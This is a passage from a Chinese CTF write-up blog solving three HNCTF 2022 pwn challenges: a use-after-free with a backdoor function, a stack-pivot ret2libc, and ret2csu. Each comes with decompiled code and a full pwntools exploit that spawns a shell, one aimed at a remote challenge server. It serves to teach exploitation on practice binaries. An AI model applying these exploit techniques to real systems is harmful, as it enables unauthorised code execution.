class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        **(&amp;girlfriendlist + i) = print_girlfriend_name;<br>        <span class="hljs-comment">// 先申请一个0x10去存print name函数</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Her name size is :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>        v3 = atoi(buf);<br>        v0 = *(&amp;girlfriendlist + i);<br>        *(v0 + <span class="hljs-number">8</span>) = <span class="hljs-built_in">malloc</span>(v3);<br>        <span class="hljs-comment">// 再申请去存数据</span><br>        <span class="hljs-keyword">if</span> ( !*(*(&amp;girlfriendlist + i) + <span class="hljs-number">1</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Her name is :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *(*(&amp;girlfriendlist + i) + <span class="hljs-number">1</span>), v3);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !Wow YDS get a girlfriend!&quot;</span>);<br>        ++count;<br>        <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;<br>&#125;<span class="hljs-comment">// add_girlfriend</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">print_girlfriend_name</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(*(a1 + <span class="hljs-number">8</span>));<br>&#125;<span class="hljs-comment">// print_girlfriend_name</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">del_girlfriend</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0</span> &amp;&amp; v1 &lt; count )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(&amp;girlfriendlist + v1) )<br>    &#123;<br>      <span class="hljs-built_in">free</span>(*(*(&amp;girlfriendlist + v1) + <span class="hljs-number">1</span>));<br>      <span class="hljs-comment">// free掉存数据chunk</span><br>      <span class="hljs-built_in">free</span>(*(&amp;girlfriendlist + v1));<br>      <span class="hljs-comment">// free掉存print name函数的chunk</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<span class="hljs-comment">// del_girlfriend</span><br></code></pre></td></tr></table></figure><p>del这里其实很明显free后没赋nullptr，导致指针指向地址处若被另外分配则未赋nullptr指针也可调用该内容。这是一个很标准的UAF（Use After Free）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">print_girlfriend</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0</span> &amp;&amp; v1 &lt; count )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(&amp;girlfriendlist + v1) )<br>      (**(&amp;girlfriendlist + v1))(*(&amp;girlfriendlist + v1));<br>  &#125;<span class="hljs-comment">// 正常为print name函数的位置不为空就用print name函数去打印存入的数据</span><br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<span class="hljs-comment">// print_girlfriend</span><br></code></pre></td></tr></table></figure><p>有一个函数叫“backdoor”，其地址起始于0x400B9C，这是我们最终需要ret2的位置，因为这里可以getshell。</p><p>思路前面也提到了是UAF，也不过就是覆盖print_girlfriend_name为backdoor地址，然后在调用时候就跳转过去了。有的师傅写的有double free但是也没构造出来，如果有人成功了请联系我。</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./gf&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./gf&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">duan</span>():<br>    gdb.attach(io)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, name = <span class="hljs-string">b&#x27;0xdeadbeef&#x27;</span></span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;is :&#x27;</span>, size)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;is :&#x27;</span>, name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;Index :&#x27;</span>, index)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;Index :&#x27;</span>, index)<br><br><span class="hljs-comment">#duan()</span><br>add(<span class="hljs-string">b&#x27;32&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;32&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;16&#x27;</span>, p64(elf.sym[<span class="hljs-string">&#x27;backdoor&#x27;</span>]))<br>show(<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>加个断点自行调试理解其中内容。堆的内容还是需要大家多多自行调试观察执行去理解，不能纯靠理论。毕竟是实践出真知。</p><h1 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h1><p>本题选自HNCTF 2022 WEEK2，题目描述为“栈迁移（试试看了什么保护）”。题目链接：<a href="https://www.nssctf.cn/problem/2962">pivot | NSSCTF</a>。</p><p>checksec：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec pivot<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/pivot&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x98</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, buf);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Over&quot;</span>);<br>&#125;<span class="hljs-comment">// main</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+108h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x120</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;G00DBYE.&quot;</span>);<br>&#125;<span class="hljs-comment">// vuln</span><br></code></pre></td></tr></table></figure><p>其实从可以进行第二次溢出但空间不够一点上就可以看出第一次输入为了得到canary，第二次为了满足栈迁移，然后泄露函数地址，返回到函数开头后，再利用栈溢出getshell。最终再ret2libc，记得堆栈平衡。</p><p>由于附件提供了libc.so.6便很好办了，记得引用上。</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./pivot&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>, <span class="hljs-literal">False</span>)<br><br>pop_rdi = <span class="hljs-number">0x401343</span><br>ret = <span class="hljs-number">0x40101a</span><br>leave_ret = <span class="hljs-number">0x401213</span><br><span class="hljs-comment"># 泄露canary</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;Name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span>)<br>canary = u64(io.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xa</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>io.sendafter(<span class="hljs-string">b&#x27;\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">264</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x4010D0</span>))<br><span class="hljs-comment"># libc_base</span><br>io.sendafter(<span class="hljs-string">b&quot;Name:\n&quot;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br>__libc_start_call_main = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">128</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;__libc_start_call_main=&quot;</span>,<span class="hljs-built_in">hex</span>(__libc_start_call_main))<br>libc_base=__libc_start_call_main-<span class="hljs-number">0x29d10</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;libc_base=&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br>sys=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;sys=&quot;</span>,<span class="hljs-built_in">hex</span>(sys))<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x4010D0</span>)<br>io.send(payload)<br><span class="hljs-comment"># rop链构造</span><br>io.recvuntil(<span class="hljs-string">&#x27;Name:\n&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span><br>io.send(payload)<br>io.recvuntil(payload)<br>stack=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack=&quot;</span>,<span class="hljs-built_in">hex</span>(stack))<br>buf=stack-<span class="hljs-number">0x268</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;buf_addr=&quot;</span>,<span class="hljs-built_in">hex</span>(buf))<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys)<br>payload=payload.ljust(<span class="hljs-number">0x108</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload+=p64(canary)+p64(buf)+p64(leave_ret)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>本题选自 HNCTF 2022 WEEK2，题目描述为<code>ret2csu hint:试试用__libc_csu_init函数里的gadget来控制寄存器和程序执行流</code>。题目链接：<a href="https://www.nssctf.cn/problem/2963">ret2csu | NSSCTF</a>。</p><p>checksec：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec ret2csu<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/ret2csu&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401290</span>                               loc_401290:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>↓j<br>.text:<span class="hljs-number">0000000000401290</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> F2                      mov     rdx, r14<br>.text:<span class="hljs-number">0000000000401293</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> EE                      mov     rsi, r13<br>.text:<span class="hljs-number">0000000000401296</span> <span class="hljs-number">44</span> <span class="hljs-number">89</span> E7                      mov     edi, r12d<br>.text:<span class="hljs-number">0000000000401299</span> <span class="hljs-number">41</span> FF <span class="hljs-number">14</span> DF                   call    ds:(__frame_dummy_init_array_entry - <span class="hljs-number">403E10</span>h)[r15+rbx*<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">0000000000401299</span><br>.text:<span class="hljs-number">000000000040129</span>D <span class="hljs-number">48</span> <span class="hljs-number">83</span> C3 <span class="hljs-number">01</span>                   add     rbx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">00000000004012</span>A1 <span class="hljs-number">48</span> <span class="hljs-number">39</span> DD                      cmp     rbp, rbx<br>.text:<span class="hljs-number">00000000004012</span>A4 <span class="hljs-number">75</span> EA                         jnz     <span class="hljs-type">short</span> loc_401290<br>.text:<span class="hljs-number">00000000004012</span>A4<br>.text:<span class="hljs-number">00000000004012</span>A6<br>.text:<span class="hljs-number">00000000004012</span>A6                               loc_4012A6:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">35</span>↑j<br>.text:<span class="hljs-number">00000000004012</span>A6 <span class="hljs-number">48</span> <span class="hljs-number">83</span> C4 <span class="hljs-number">08</span>                   add     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">00000000004012</span>AA <span class="hljs-number">5B</span>                            pop     rbx<br>.text:<span class="hljs-number">00000000004012</span>AB <span class="hljs-number">5</span>D                            pop     rbp<br>.text:<span class="hljs-number">00000000004012</span>AC <span class="hljs-number">41</span> <span class="hljs-number">5</span>C                         pop     r12<br>.text:<span class="hljs-number">00000000004012</span>AE <span class="hljs-number">41</span> <span class="hljs-number">5</span>D                         pop     r13<br>.text:<span class="hljs-number">00000000004012B</span>0 <span class="hljs-number">41</span> <span class="hljs-number">5</span>E                         pop     r14<br>.text:<span class="hljs-number">00000000004012B</span>2 <span class="hljs-number">41</span> <span class="hljs-number">5F</span>                         pop     r15<br>.text:<span class="hljs-number">00000000004012B</span>4 C3                            retn<br>.text:<span class="hljs-number">00000000004012B</span>4                               ; &#125; <span class="hljs-comment">// starts at 401250</span><br><span class="hljs-comment">// __libc_csu_init汇编片段</span><br></code></pre></td></tr></table></figure><p>其中其实就是很标准的ret2csu类型题的做法了，但这道题的控制rdx、rsi、edi处与之前做的其他题顺序是反的导致做题当时很疑惑还卡了一会。这种题都是有一个很一致的EXP模板，抄一下其实就够用了，注意一下front中的内容就可以了。</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#io = process(&#x27;./ret2csu&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;43.143.7.97&#x27;</span>, <span class="hljs-number">28867</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2csu&#x27;</span>)<br>bss_base = elf.bss()<br>csu_front_addr = <span class="hljs-number">0x0000000000401290</span><br>csu_end_addr = <span class="hljs-number">0x00000000004012AA</span><br>fakeebp = <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">8</span><br>prdir = <span class="hljs-number">0x4012b3</span><br>ret = <span class="hljs-number">0x40101a</span><br><span class="hljs-comment"># csu</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx should be 0,</span><br>    <span class="hljs-comment"># rbp should be 1,enable not to jump</span><br>    <span class="hljs-comment"># r12 should be the function we want to call</span><br>    <span class="hljs-comment"># rdi=edi=r12d</span><br>    <span class="hljs-comment"># rsi=r13</span><br>    <span class="hljs-comment"># rdx=r14</span><br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + fakeebp<span class="hljs-comment"># offset + 任意bp</span><br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12)<br>    payload += p64(r13) + p64(r14) + p64(r15)<br>    <span class="hljs-comment"># ret2 end部分去把rbx rbp r12 r13 r14 r15寄存器附上值</span><br>    payload += p64(csu_front_addr)<br>    <span class="hljs-comment"># ret2 front部分用r14 r13 r12d给rdx rsi edi赋值</span><br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-comment"># 到end部分重新pop，但不影响</span><br>    payload += p64(last)<br>    <span class="hljs-comment"># 占用retn，回到需要回到的地方</span><br>    io.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">8</span>, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>])<br><span class="hljs-comment"># 泄露libc，ret2libc3，一定要执行的是got表中的内容，打印的也是got表中的内容</span><br><span class="hljs-comment"># 如果是mov rdx, r12; mov rsi, r13; mov edi, r14d那种，应该是写成</span><br><span class="hljs-comment"># csu(0, 1, elf.got[&#x27;write&#x27;], 8, elf.got[&#x27;write&#x27;], 1, elf.sym[&#x27;vuln&#x27;])，下同</span><br>io.recvuntil(<span class="hljs-string">b&quot;Ok.\n&quot;</span>)<br>write_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys_addr), <span class="hljs-built_in">hex</span>(bsh_addr))<br><span class="hljs-comment"># io.recvuntil(&#x27;Input:\n&#x27;)</span><br><span class="hljs-comment"># csu(0, 1, 0, bsh_addr, 0, execve_addr, p64(0xdeadbeef))</span><br><span class="hljs-comment"># 也可以像ctf-wiki上一样做，在bss上存再在bss上操</span><br>io.sendlineafter(<span class="hljs-string">b&quot;Input:\n&quot;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(ret) + p64(prdir) + p64(bsh_addr) + p64(sys_addr))<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于glibc-SSP发生方式在不同版本中的研究</title>
    <link href="/2023/03/25/%E5%85%B3%E4%BA%8Eglibc-SSP%E5%8F%91%E7%94%9F%E6%96%B9%E5%BC%8F%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
